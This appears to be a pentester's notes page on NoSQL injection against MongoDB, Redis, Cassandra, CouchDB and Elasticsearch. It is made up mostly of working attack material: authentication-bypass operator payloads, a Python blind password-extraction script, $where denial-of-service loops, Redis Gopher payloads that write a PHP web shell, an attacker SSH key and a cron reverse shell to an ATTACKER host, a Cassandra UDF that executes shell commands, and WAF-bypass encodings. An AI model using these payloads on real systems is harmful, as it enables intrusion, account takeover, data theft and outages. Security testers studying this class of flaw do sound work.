+++
title = 'NoSQL Injection'
date = 2026-10-30
type = 'notes'
weight = 40
toc = true
tags = ['web', 'web-attacks', 'nosql', 'injection']
+++

NoSQL injection occurs when user-controlled input is interpreted as part of a NoSQL query — as an **operator**, a **JSON structure**, or a **JavaScript expression** — rather than as a literal value. It is classified as **CWE-943** (Improper Neutralization of Special Elements in Data Query Logic) and sits under **OWASP Top 10 A05:2025 (Injection)**.

> **2025–2026 context:** the class is no longer just `{"$ne": null}` in a login form. The current CVE feed is dominated by **ORM-layer flaws** (Mongoose `$where` nesting, CVE-2025-23061), **unauthenticated multi-database operator injection** (Budibase, CVE-2026-54350), **Redis command injection via SSRF/Gopher**, and **Cassandra UDF RCE** on legacy deployments. The common thread: the application **has** a schema or an ODM, and the library **coerces a type** or **falls back to a code path** the developer did not anticipate.

Unlike SQL, NoSQL has **no standardised query language**, so the attack differs by backend:

| NoSQL type | Description | Injection surface |
|---|---|---|
| **Document** (MongoDB, CouchDB) | JSON/BSON documents | **Operator injection** (`$ne`, `$gt`, `$regex`, `$where`) |
| **Key-Value** (Redis) | Key → value | **Command injection** via CRLF / SSRF-Gopher |
| **Wide-Column** (Cassandra) | Tables, rows, columns | **CQL injection** — smaller surface, UDF RCE |
| **Search** (Elasticsearch) | JSON DSL | **DSL injection**, Painless scripting |

---

## 1. Useful Resources

- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks — NoSQL Injection](https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html)
- [NullSweep — NoSQL Injection Cheat Sheet](https://nullsweep.com/nosql-injection-cheatsheet/)
- [SecLists — NoSQL.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/SQLi/NoSQL.txt)
- [cr0hn — MongoDB NoSQLi wordlist](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)
- [Burp NoSQLi extension](https://portswigger.net/bappstore/605a859f0a814f0cbbdce92bc64233b4)
- [SentinelOne — What Is NoSQL Injection?](https://www.sentinelone.com/cybersecurity-101/cybersecurity/nosql-injection/) — CWE-943 classification and 2025–2026 CVE context

---

## 2. Tools

### 2.1 NoSQLMap — legacy, still usable

NoSQLMap is a **Python 2** tool; the repository's installation instructions do not work on a modern system. The workaround:

```bash
git clone https://github.com/codingo/NoSQLMap.git
cd NoSQLMap
sudo apt install python2.7
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
pip2 install couchdb
pip2 install --upgrade setuptools
pip2 install pbkdf2
pip2 install pymongo
pip2 install ipcalc
```

```bash
python2 nosqlmap.py --attack 2 --victim 127.0.0.1 --webPort 80 --uri /index.php \
  --httpMethod POST --postData param1name,parameter1value,param2name,parameter2value \
  --injectedParameter 1 --injectSize 5
```

`--injectedParameter 1` selects the parameter at index 1 in `postData` — `parameter2name` in the example.

> **The tool is stale.** Its last release is 0.5 (2016), it supports only MongoDB and CouchDB, and it does not understand modern operator payloads. It is worth keeping for a quick MongoDB auth-bypass check, but not as a primary tool.

### 2.2 Modern tools (2025–2026)

| Tool | What it covers |
|---|---|
| **nosqli** (`charlie-belmer/nosqli`) | Fast **MongoDB-focused** scanner and injector — error-based, boolean-blind, and timing-based scanning. Feeds from a URL, a Burp/ZAP request file, or POST data |
| **nosql-scanner** (`regaan/nosql-scanner`) | **Multi-database** scanner — MongoDB, Redis, Cassandra, Elasticsearch. **150+ payloads**, database cloning, and a **SQLMap module** (`nosql_scanner.py`) |
| **sqlmap** (`--technique=N`) | Built-in **NoSQL module** — MongoDB operator injection and **binary-search bisection** over `$regex` for blind extraction |
| **Decepticon / hunt-nosqli** (agent skills) | Structured methodology: `$ne`, `$gt`, `$where`, `$regex`, CouchDB/Firebase/Redis patterns, auth bypass, blind extraction |
| **Gopherus** | Generates Redis/Gopher payloads for SSRF → RCE |
| **Burp NoSQLi** | Manual operator probing and SSJI testing |

**nosqli usage:**

```bash
# URL
nosqli scan --target 'http://example.com/user?id=1'

# Captured request
nosqli scan --request req.txt

# POST data
nosqli scan --target 'http://example.com/login' --data 'username=admin&password=x'
```

**sqlmap NoSQL mode:**

```bash
sqlmap -u "http://target/login" --data "username=admin&password=x" --technique=N --batch --dump
```

---

## 3. Authentication Bypass

The vulnerable pattern:

```javascript
db.users.find({ username: req.body.username, password: req.body.password })
```

If the input is not type-checked, an object where a string is expected becomes a **query operator**.

### 3.1 Operator injection — URL-encoded form

PHP and Express.js deserialise `param[$op]=value` into `{ param: { $op: value } }` **before the application code runs**. This is a framework-level type coercion, not a deliberate feature.

```http
POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username[$ne]=wrong&password[$ne]=wrong
```

Equivalent to `{ username: { $ne: "wrong" }, password: { $ne: "wrong" } }` — matches every user whose username and password are not `"wrong"`.

**Other operators:**

```
username[$gt]=&password[$gt]=        # any value greater than empty → matches everything
username[$gte]=&password[$gte]=      # same
username[$regex]=.*&password[$regex]=.*   # matches any string
username[$exists]=true&password[$exists]=true
```

### 3.2 Operator injection — JSON body

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Targeted at a known admin:**

```json
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$nin": ["wrong"]}}
```

### 3.3 Syntax injection — string context

When the input is concatenated into a JavaScript expression rather than parsed as JSON:

```
admin'--
admin'#
admin'//
admin'/*
admin' || '1'=='1
admin' && '1'=='1
```

---

## 4. Data Extraction

### 4.1 In-band

If the response reflects the returned documents, an always-true operator dumps the collection:

```
param[$ne]=x
param[$gt]=
param[$regex]=.*
```

```json
{"param": {"$ne": "x"}}
{"param": {"$gt": ""}}
{"param": {"$regex": ".*"}}
{"param": {"$nin": []}}
```

> Queries run against a **specific collection** — extraction is limited to the collection the vulnerable query targets. `$lookup` is the only way to cross collections, and it requires an aggregation pipeline.

### 4.2 Blind — `$regex` character-by-character

When the response gives only a boolean signal (valid / invalid, success / error):

```
{"packageNumber":{"$regex":"^0.*"}}
{"packageNumber":{"$regex":"^1.*"}}
...
{"packageNumber":{"$regex":"^21.*"}}
{"packageNumber":{"$regex":"^221.*"}}
{"packageNumber":{"$regex":"^2221262$"}}
```

The trailing `$` confirms the full value has been matched — without it, a prefix that happens to be correct will also return true.

**Extracting a password with an `AND` clause:**

```
username=sfoffo)(password=*
username=sfoffo)(password=i*
username=sfoffo)(password=it*
username=sfoffo)(password=italy
```

### 4.3 Blind — binary search (the 2026 refinement)

Character-by-character over a 95-character alphabet is **~7× slower** than necessary. `sqlmap`'s NoSQL module and the current extraction skills use **bisection over character codepoints**:

```python
import requests, string

def extract(url, user, field="password"):
    value = ""
    while True:
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            # MongoDB $regex with a codepoint comparison
            payload = f'admin" && this.{field}.charCodeAt({len(value)})>{mid} || "x"="y'
            if "Welcome" in requests.get(url, params={"user": payload}).text:
                low = mid + 1
            else:
                high = mid - 1
        if low == 32:
            return value          # no character matched — end of string
        value += chr(low)
```

| Technique | Requests per character |
|---|---|
| `$regex` prefix loop (95-char set) | ~48 on average, 95 worst case |
| **Binary search (`charCodeAt`)** | **~7** |

### 4.4 Blind — `$where` schema enumeration

`$where` executes JavaScript on the MongoDB server. It is not limited to the value of a field — it can inspect the **document structure**:

```json
{"$where": "Object.keys(this).length == 5"}
{"$where": "Object.keys(this)[1].match('^.{0}u.*')"}
{"$where": "'resetToken' in this"}
{"$where": "this.resetToken.match('^.{0}a.*')"}
{"$where": "this.password.length == 8"}
{"$where": "this.password.charCodeAt(0)>109"}
```

This is how you discover **which fields exist** before extracting them — a step that is often skipped and then guessed at.

### 4.5 Timing-based blind

If the application gives no boolean signal, inject a delay into `$where`:

```json
{"$where": "if (this.password.match('^a')) { sleep(5000) }"}
```

```json
{"$where": "function(){ if(this.password[0]=='a'){ var x=0; while(x<50000000){x++} } return true }"}
```

The second payload is a **busy-loop**, not a `sleep()` call — MongoDB's JavaScript context does not expose a reliable `sleep()`, and a busy-loop is the portable equivalent.

---

## 5. Server-Side JavaScript Injection (SSJI)

When the server concatenates user input into a **JavaScript expression** rather than building a query object, the input is evaluated as code.

### 5.1 The vulnerable pattern

```javascript
.find({$where: "this.username == \"" + req.body['username'] + "\" && this.password == \"" + req.body['password'] + "\""});
```

### 5.2 Authentication bypass

```
username = " || ""=="
password = x
```

Produces:

```javascript
this.username == "" || ""=="" && this.password == "" || ""==""
```

Which evaluates to `true` for the first document — logging in as a random user.

A **targeted** variant, if a username is known:

```
username = admin" || "1"="1
```

### 5.3 Blind data extraction via `$where`

If the bypass logs you in as an **invalid** user (or fails), you can still use the boolean oracle to enumerate usernames:

```
username = " || (this.username.match('^a.*')) || ""=="
...
username = " || (this.username.match('^sf.*')) || ""=="
...
username = " || (this.username.match('^sfoffo$')) || ""=="
```

The same technique extracts the password field, `resetToken`, or any other attribute — replace `this.username` with `this.password` or `this.resetToken`.

### 5.4 Denial of service

`$where` runs **synchronously on the MongoDB server**. A busy-loop payload locks the instance:

```json
{"$where": "var x=0; while(x<1000000000){x++}; return true"}
```

This is a **single-request DoS** — no authentication required if the injection point is pre-auth.

---

## 6. Redis Injection

Redis listens on a **plain-text protocol (RESP)**. Injection occurs when an application concatenates user input into a command, or when an SSRF reaches Redis through **`gopher://`**.

### 6.1 CRLF command injection

RESP commands are separated by `\r\n`. If the application does `SET user:<input> value`, an input containing `\r\n` terminates the command and starts a new one:

```
input = "x\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x \"<?php system($_GET['c']);?>\"\r\nSAVE"
```

### 6.2 SSRF → Gopher → Redis RCE

**Precondition:** an SSRF that allows the `gopher://` scheme and a Redis instance reachable from the application server (usually `127.0.0.1:6379`).

**Confirm reachability:**

```
gopher://127.0.0.1:6379/_PING
gopher://127.0.0.1:6379/_INFO
```

**Write a PHP web shell:**

```
SET 1 "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SAVE
```

Then `http://target/shell.php?c=id`.

**Write an SSH key:**

```
FLUSHALL
SET 1 "\n\nssh-ed25519 AAAA... attacker\n\n"
CONFIG SET dir /root/.ssh          # or /var/lib/redis/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
```

> **Two key hygiene points from the 2025–2026 references:** use **ed25519** rather than RSA-2048 (OpenSSH ≥ 9 rejects `ssh-rsa` SHA-1 signatures by default), and `FLUSHALL` between attempts — a stacked RDB merges binary noise into the file and SSHd may not find the new key.

**Write a cron reverse shell:**

```
SET 1 "\n* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
CONFIG SET dir /var/spool/cron/crontabs
CONFIG SET dbfilename root
SAVE
```

**Tool:** `gopherus --exploit redis` generates the RESP-encoded payload; the Gopher URL is then fed to the SSRF parameter.

---

## 7. Cassandra CQL Injection

CQL looks like SQL but has a **much smaller attack surface**: no `UNION`, no subqueries, no `OR` in many versions, and no `SLEEP()`. The injection still works for **auth bypass** and **enumeration**, and **RCE is achieved through UDFs** on older versions.

### 7.1 Default credentials

```bash
cqlsh target.example 9042 -u cassandra -p cassandra
cqlsh target.example 9042 -u admin -p admin
```

Default credentials are common in lab and dev deployments.

### 7.2 Auth bypass

```
' OR '1'='1
admin'--
admin' OR 1=1--
```

CQL accepts `--` and `//` comments.

### 7.3 Enumeration

```sql
SELECT keyspace_name FROM system_schema.keyspaces;
SELECT table_name FROM system_schema.tables WHERE keyspace_name='targetks';
SELECT column_name FROM system_schema.columns WHERE table_name='users';
SELECT username, password FROM users;
```

`system_schema` is public-readable on most installations.

**Bypassing the partition-key restriction** with `ALLOW FILTERING`:

```sql
' OR username='admin' ALLOW FILTERING--
```

### 7.4 UDF RCE (Cassandra ≤ 3.0, or `enable_user_defined_functions=true`)

```sql
CREATE OR REPLACE FUNCTION system.exec(inp text)
CALLED ON NULL INPUT RETURNS text
LANGUAGE java AS $$
  String[] cmd = {"/bin/sh","-c",inp};
  java.util.Scanner s = new java.util.Scanner(
    Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
  return s.hasNext()?s.next():"";
$$;

SELECT system.exec('id') FROM system.local;
```

`system.local` is a single-row table, so the UDF runs exactly once and returns the command output.

> **2026 CVEs in this class:** CVE-2026-11451 (Cassandra injection via incomplete parameterisation), GHSA-jfwg-rxf3-p7r9 (Authorizer CQL/N1QL injection via `fmt.Sprintf` in Cassandra/Couchbase backends — unauthenticated, through `email`, `phone`, or `token` parameters on signup/login/forgot-password endpoints).

---

## 8. CouchDB and Elasticsearch

### 8.1 CouchDB

CouchDB exposes a **REST/HTTP API**. Injection occurs when user input reaches **view definitions** or **Mango selectors**.

- **MapReduce views** run JavaScript — a user-influenced view definition is **server-side code execution**.
- **`selector` injection** — a Mango selector that accepts an operator object behaves like MongoDB's operator injection.
- **Replication SSRF** — the `_replicate` endpoint can be abused to make the server fetch internal URLs.

```json
{"selector": {"username": {"$ne": null}, "password": {"$ne": null}}}
```

### 8.2 Elasticsearch

Elasticsearch's query DSL is JSON. Injection occurs when user input is **concatenated into the DSL** without escaping:

```json
{"query": {"match": {"username": "admin"}}, "script": {"script": "..."}}
```

**Painless scripting** is the RCE surface — historically Groovy had direct RCE bugs, and Painless is sandboxed but has had escapes. A `script` field that accepts user input is a code-execution primitive.

---

## 9. Encoding and WAF Bypass

URL-encode operator names and structural characters when a WAF blocks the literal form:

| Character | Encoding |
|---|---|
| `$` | `%24` |
| `[` / `]` | `%5B` / `%5D` |
| `{` / `}` | `%7B` / `%7D` |
| `=` | `%3D` |
| `&` | `%26` |
| `\|` | `%7C` |
| `'` | `%27` |
| `"` | `%22` |

```
username%5B$ne%5D=wrong
```

**Content-Type switching** — if the WAF inspects `application/x-www-form-urlencoded` but not `application/json`, send the operator object as JSON. If it inspects JSON but not form-encoded, send `username[$ne]=`. The two representations reach the same parser.

**Case and whitespace** — MongoDB operators are case-sensitive (`$ne` ≠ `$NE`), so case variation is not useful. Whitespace between JSON tokens, however, is frequently normalised differently by the WAF and the parser.

---

## 10. Recent NoSQL Injection CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2025-23061** | Mongoose < 8.9.5 | **Nested `$where` inside `$and`** in `populate()` bypasses the CVE-2024-53900 fix → arbitrary JavaScript on MongoDB |
| **CVE-2024-53900** | Mongoose | Direct `$where` injection in `populate()` — the bug CVE-2025-23061 incompletely fixed |
| **CVE-2026-54350** | Budibase < 3.39.12 | **Unauthenticated** operator injection through published-app query templates — full collection read (and write if a write query is published) on MongoDB, CouchDB, Elasticsearch, DynamoDB-PartiQL |
| **CVE-2026-29198** | Rocket.Chat < 8.3.0 / 8.2.1 / 8.1.2 / 8.0.3 | NoSQL injection in the account service → **account takeover of the first user** when an OAuth app is configured |
| **CVE-2026-30833** | Rocket.Chat DDP-streamer | Unauthenticated MongoDB query manipulation during authentication |
| **CVE-2026-11451** | Cassandra applications | Incomplete parameterisation → CQL injection |
| **GHSA-jfwg-rxf3-p7r9** | Authorizer (Cassandra/Couchbase) | `fmt.Sprintf` interpolation → unauthenticated CQL/N1QL injection via signup/login/forgot-password |
| **CVE-2025-60357** | AhnLab EPP Management | MongoDB injection via `eventlog/agentEvent/list` |
| **CVE-2025-105799** | Various | CWE-943 across Cassandra, Elasticsearch, MongoDB, Redis |
| **CVE-2019-10758** | mongo-express < 0.54.0 | RCE through the admin UI — **still scanned for in 2026** |

> **The pattern across every 2025–2026 entry:** the application **has** a schema, an ODM, or a type check — and the vulnerability exists because the **library** coerces a type (Express `body-parser`, PHP `$_POST`), **falls back to a code path** (Mongoose `$where` nesting), or **interpolates a string** (`fmt.Sprintf` in the Cassandra/Couchbase backends). The fix is not a better regex; it is **scalar type enforcement before the query is built**, and **rejecting keys that begin with `$`**.

---

## 11. Testing Methodology

```bash
# 1. Identify NoSQL-backed inputs
#    login · search · filters · API JSON bodies · password reset
#    any parameter that reaches a document or key-value store

# 2. Confirm type coercion
#    Send an operator instead of a string
username[$ne]=wrong
{"username": {"$ne": null}}

# 3. Attempt auth bypass
#    Target a known user, or match everything
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

# 4. In-band extraction — if results are reflected
param[$regex]=.*

# 5. Blind extraction — if only a boolean signal exists
#    Use binary search on charCodeAt, not a 95-char regex loop
{"$where": "this.password.charCodeAt(0)>109"}

# 6. Enumerate the schema with $where
{"$where": "Object.keys(this).length == 5"}
{"$where": "'resetToken' in this"}

# 7. Test SSJI — string-concatenated queries
username = " || (this.username.match('^a.*')) || ""=="

# 8. If Redis is reachable through an SSRF, use gopher
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html

# 9. If Cassandra is the backend, check default credentials and UDFs
cqlsh target 9042 -u cassandra -p cassandra

# 10. If a WAF blocks the payload, URL-encode and switch Content-Type
username%5B%24ne%5D=wrong
```

---

## 12. Field Notes

- **`$ne` is the shortest auth bypass.** `{"$ne": null}` on both fields matches every user — one request, no brute force.
- **Framework coercion is the root cause.** Express `body-parser` turns `password[$ne]=x` into `{ password: { $ne: "x" } }` **before the application code runs**. A scalar type check is the only durable fix.
- **Blind extraction should use binary search.** `charCodeAt` bisection resolves a character in ~7 requests; a `$regex` prefix loop needs ~48.
- **`$where` is the schema-enumeration primitive.** `Object.keys(this)` reveals field names before you try to extract their values.
- **`$where` is also a DoS primitive.** A busy-loop payload locks the MongoDB instance synchronously.
- **Mongoose `$where` nesting is the 2025 CVE class.** Blocking direct `$where` is insufficient — `$and: [{ $where: ... }]` bypasses the filter (CVE-2025-23061).
- **Redis via Gopher is the RCE path.** `CONFIG SET dir` + `dbfilename` + `SAVE` writes a web shell, an SSH key, or a cron entry. Use ed25519 and `FLUSHALL` between attempts.
- **Cassandra RCE needs UDFs.** Cassandra ≤ 3.0 enables them by default; 3.x+ requires `enable_user_defined_functions=true`, which is often flipped on for analytics.
- **The multi-database scanner is `nosql-scanner`.** 150+ payloads across MongoDB, Redis, Cassandra, and Elasticsearch — the practical replacement for the stale NoSQLMap.
- **CWE-943 is not CWE-89.** If your report or scanner taxonomy tracks only SQL injection, NoSQL findings are missed entirely.
